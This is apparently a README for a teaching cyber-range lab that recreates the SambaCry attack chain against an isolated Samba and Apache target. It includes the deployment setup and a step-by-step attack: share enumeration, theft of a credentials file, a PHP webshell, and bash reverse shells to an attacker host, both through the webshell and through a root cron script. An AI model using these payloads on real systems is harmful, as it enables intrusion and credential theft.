# SambaCry Attack Chain Lab

This lab simulates the attack methodology of CVE-2017-7494 (SambaCry) — exploiting anonymous-writable SMB shares to achieve code execution and privilege escalation. The environment consists of a Samba server with two world-writable shares and an Apache web server serving PHP from one of them, enabling the classic "SMB write → HTTP webshell execute" attack chain.

> **Note on CVE-2017-7494:** The original SambaCry vulnerability requires Samba < 4.6.4 (pipe name IPC exploit). Ubuntu 24.04 ships with a patched Samba version, so this lab recreates the same attack *primitive* — anonymous SMB write → code execution — using a web server + cron escalation mechanism. The attack methodology, tools, and concepts are identical.

## Detailed Deploying Steps

### Deploy the Cyber Range Environment

1. In the "Model Editor" interface of the SPHERE platform, deploy the following model.
    ```python
    from mergexp import *

    net = Network('SambaCry-Lab', addressing==ipv4, routing==static)

    attacker = net.node('attacker', image=='kali', proc.cores>=8, memory.capacity>=gb(32))
    victim = net.node('victim', image=='2404', proc.cores==2, memory.capacity==gb(2))

    link = net.connect([attacker, victim])

    link[attacker].socket.addrs = ip4('10.0.0.1/24')
    link[victim].socket.addrs   = ip4('10.0.0.2/24')

    experiment(net)
    ```

2. Create a Reservation based on that model.

3. Activate the Reservation.

4. If the Ubuntu 24.04 root disk is not automatically expanded, run on the victim machine:
    ```
    sudo partprobe
    sudo resize2fs /dev/vda3
    ```

### Deploy the Target Victim Machine

0. [Install Ansible](../setup_ansible/readme.md) on your XDC before proceeding.

1. The [`inventory.ini`](inventory.ini) is pre-configured to use SPHERE's DNS short name — no IP address lookup needed:
    ```ini
    [samba_vm]
    samba-target ansible_host=victim.infra ansible_user=lexuswang ansible_become_pass=lexuswang

    [samba_vm:vars]
    ansible_python_interpreter=/usr/bin/python3
    ```
    `victim.infra` automatically resolves to the victim's infranet address via SPHERE DNS. Update `ansible_user` and `ansible_become_pass` if your SPHERE username differs from `lexuswang`.

2. Run the playbook:
    ```bash
    ansible-playbook -i inventory.ini sambacry_target.yml --ask-become-pass
    ```

### Deploy the Attack Machine

Please refer to this [doc](../attacker_setup/readme.md) to set up the attack machine.

---

## Detailed Information about the Target System

**Services:**
- Samba (SMB) on ports 139, 445
- Apache2 (HTTP) on port 80

**Victim experiment network IP:** `10.0.0.2` (fixed in `merge_model.py`)

**SMB Shares:**

| Share | Path | Access |
|-------|------|--------|
| `data` | `/srv/samba/share` | Anonymous read/write |
| `www` | `/srv/samba/www` | Anonymous read/write (served by Apache) |

**Web URL:** `http://10.0.0.2/`

**Service management:**
```bash
systemctl status smbd
systemctl status apache2
```

---

## Testing (from attacker machine)

All commands below run on the Kali attacker machine (`10.0.0.1`).

### Phase 1: SMB Enumeration

```bash
# Service scan
nmap -sV -p 139,445 10.0.0.2

# List shares with null session
smbclient -L //10.0.0.2/ -N

# Check share permissions
smbmap -H 10.0.0.2
```

Expected output: two writable shares (`data`, `www`) accessible without credentials.

### Phase 2: Access Share and Gather Intel

```bash
# Download credentials file directly
smbclient //10.0.0.2/data -N -c 'get internal_credentials.txt /tmp/creds.txt'
cat /tmp/creds.txt

# Or connect interactively
smbclient //10.0.0.2/data -N
smb: \> ls
smb: \> get internal_credentials.txt
smb: \> exit
```

### Phase 3: Upload WebShell via SMB → Execute via HTTP

```bash
# Create PHP webshell
echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php

# Upload to the 'www' share (Apache serves this directory)
smbclient //10.0.0.2/www -N -c 'put /tmp/shell.php shell.php'

# Execute commands via HTTP
curl "http://10.0.0.2/shell.php?cmd=id"
curl "http://10.0.0.2/shell.php?cmd=whoami"
curl "http://10.0.0.2/shell.php?cmd=hostname"
```

Expected output: `uid=33(www-data)` — RCE confirmed as the Apache user.

```bash
# Reverse shell via webshell (start listener first)
nc -lvnp 4444
curl "http://10.0.0.2/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.0.0.1/4444+0>%261'"
```

### Phase 4: Privilege Escalation via Cron (Root Shell)

A root cron job checks for `/srv/samba/share/.run.sh` every minute and executes it. This simulates the shared library loading mechanism in CVE-2017-7494.

Start listener on attacker:
```bash
nc -lvnp 4444
```

In another terminal, upload the reverse shell trigger:
```bash
cat > /tmp/revshell.sh << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
EOF

smbclient //10.0.0.2/data -N -c 'put /tmp/revshell.sh .run.sh'
```

Wait up to 60 seconds — a root shell will appear in the `nc` listener.

---

## Attack Chain Summary

1. **Enumeration:** Discover two anonymous-writable SMB shares
2. **Intel Gathering:** Read `internal_credentials.txt` from `data` share
3. **Webshell Deployment:** Upload `shell.php` to `www` share via SMB
4. **RCE as www-data:** Execute commands through the PHP webshell over HTTP
5. **Privilege Escalation:** Drop `.run.sh` in `data` share; root cron executes it within 60s
6. **Root Shell:** Catch incoming root reverse shell on port 4444

---

## Credentials

| Account | Password |
|---------|----------|
| SMB guest | *(no password)* |
